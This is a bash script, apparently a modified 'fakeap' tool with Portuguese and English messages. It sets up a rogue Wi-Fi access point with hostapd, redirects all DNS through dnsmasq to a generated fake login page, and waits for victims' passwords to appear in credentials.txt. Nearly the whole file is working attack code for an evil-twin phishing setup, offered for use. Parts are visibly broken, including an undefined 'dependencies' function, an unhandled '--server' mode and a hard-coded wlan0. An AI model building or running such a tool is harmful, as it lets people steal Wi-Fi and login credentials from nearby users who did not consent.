#!/bin/bash

list_folders() {
  if [ ! -d "sites" ]; then
    mkdir sites
  fi

  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Pastas disponíveis:\e[0m\n"
  counter=1
  for folder in sites/*/; do
    login_page="$folder/login.php"
    if [[ -f "$login_page" ]]; then
      printf "\e[1;92m%s\e[0m: \e[1;77m%s (Página de Login Falsa)\n" $counter "$(basename "$folder")"
    else
      printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter "$(basename "$folder")"
    fi
    let counter++
  done
}

banner()  {
  printf "\e[1;77m8888888888       888                           \e[0m\e[1;92m[d8888 8888888b. \e[0m\n" 
  printf "\e[1;77m888              888                          \e[0m\e[1;92md88888 888   Y88b \e[0m\n"
  printf "\e[1;77m888              888                         \e[0m\e[1;92md88P888 888    888 \e[0m\n"
  printf "\e[1;77m8888888  8888b.  888  888  .d88b.           \e[0m\e[1;92md88P 888 888   d88P \e[0m\n"
  printf "\e[1;77m888          88b 888 .88P d8P  Y8b         \e[0m\e[1;92md88P  888 8888888P  \e[0m\n"
  printf "\e[1;77m888     .d888888 888888K  88888888 888888 \e[0m\e[1;92md88P   888 888        \e[0m\n"
  printf "\e[1;77m888     888  888 888  88b Y8b.           \e[0m\e[1;92md8888888888 888        \e[0m\n"
  printf "\e[1;77m888      Y888888 888  888   Y8888       \e[0m\e[1;92md88P     888 888\e[0m\e[1;77m v1.0\e[0m\n"
  printf "\n"
  printf "\e[1;93m                   .-  _           _  -. \n"
  printf "                  /   /             \   \ \n"
  printf "                 (   (  (\` (-o-) \`)  )   ) \n"
  printf "                  \   \_ \`  -+-  \` _/   / \n"
  printf "                   \`-       -+-       -\` \n"
  printf "                            -+- \e[0m\e[1;77mCoded by: @thelinuxchoice\e[0m\n"
  printf "\n"
}

createpage() {
  default_pass_text="Password"
  default_sub_text="Log-In"

  for site_folder in sites/*/; do
    index_path="${site_folder%/}/index.html"
    echo "<!DOCTYPE html>" > "$index_path"
    echo "<html>" >> "$index_path"
    echo "<body bgcolor=\"gray\" text=\"white\">" >> "$index_path"
    IFS=$'\n'
    
    for file in "$site_folder"/*; do
      if [ -f "$file" ]; then
        cat "$file" >> "$index_path"
        printf '<br>\n' >> "$index_path"
      fi
    done
    
    IFS=$'\n'
    printf '<form method="POST" action="%s"><label>%s </label>\n' "login.php" "$user_text" >> "$index_path"
    IFS=$'\n'
    printf '<br><label>%s: </label>' "$default_pass_text" >> "$index_path"
    IFS=$'\n'
    printf '<input type="password" name="password" length=64><br><br>\n' >> "$index_path"
    IFS=$'\n'
    printf '<input value="%s" type="submit"></form>\n' "$default_sub_text" >> "$index_path"
    printf '</center>' >> "$index_path"
    printf '<body>\n' >> "$index_path"
    printf '</html>\n' >> "$index_path"
  done
}

stop() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Encerrando todas as conexões..\n" 
  killall dnsmasq hostapd > /dev/null 2>&1
  sleep 4
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Reiniciando o Serviço de Rede..\n" 
  service networking restart
  sleep 5
}

start() {
  if [[ -e credentials.txt ]]; then
    rm -rf credentials.txt
  fi

  interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > iface)

  counter=1
  for i in $(cat iface); do
    printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter $i
    let counter++
  done

  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface to use:\e[0m ' use_interface
  choosed_interface=$(sed ''$use_interface'q;d' iface)
  IFS=$'\n'
  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID to use:\e[0m ' use_ssid
  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Channel to use:\e[0m ' use_channel
  list_folders
  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Fake page number to use:\e[0m ' fake_page_number
  fake_page=$(sed ''$fake_page_number'q;d' folders)
  createpage
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Killing all connections..\e[0m\n" 
  sleep 2
  killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
  sleep 5
  printf "interface=%s\n" $choosed_interface > hostapd.conf
  printf "driver=nl80211\n" >> hostapd.conf
  printf "ssid=%s\n" $use_ssid >> hostapd.conf
  printf "hw_mode=g\n" >> hostapd.conf
  printf "channel=%s\n" $use_channel >> hostapd.conf
  printf "macaddr_acl=0\n" >> hostapd.conf
  printf "auth_algs=1\n" >> hostapd.conf
  printf "ignore_broadcast_ssid=0\n" >> hostapd.conf
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s down\n" $choosed_interface 
  ifconfig $choosed_interface down
  sleep 4
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Setting %s to monitor mode\n" $choosed_interface
  iwconfig $choosed_interface mode monitor
  sleep 4
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s Up\n" $choosed_interface 
  ifconfig wlan0 up
  sleep 5
  hostapd hostapd.conf > /dev/null 2>&1 &
  sleep 6
  printf "interface=%s\n" $choosed_interface > dnsmasq.conf
  printf "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
  printf "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
  printf "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
  printf "server=8.8.8.8\n" >> dnsmasq.conf
  printf "log-queries\n" >> dnsmasq.conf
  printf "log-dhcp\n" >> dnsmasq.conf
  printf "listen-address=127.0.0.1\n" >> dnsmasq.conf
  printf "address=/#/192.168.1.1\n" >> dnsmasq.conf
  ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
  sleep 1
  route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
  sleep 1
  dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
  sleep 5
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] To Stop: ./fakeap.sh --stop\n"
  sudo bash fakeap.sh --server
}

catch_cred() {
  IFS=$'\n'
  password=$(grep -o 'Pass:.*' credentials.txt | cut -d ":" -f2)
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m SSID:\e[0m\e[1;77m %s\n\e[0m" $use_ssid
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Senha:\e[0m\e[1;77m %s\n\e[0m" $password
  printf " SSID: %s\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Salvo:\e[0m\e[1;77m saved.credentials.txt\e[0m\n"
  stop
  exit 1
}

getcredentials() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Aguardando credenciais ...\e[0m\n"
  while [ true ]; do
    if [[ -e "credentials.txt" ]]; then
      printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credenciais Encontradas!\n"
      catch_cred
    fi
    sleep 1
  done 
}

case "$1" in
--stop)
  stop
  ;; 
*)
  banner 
  dependencies
  start
  ;; 
esac
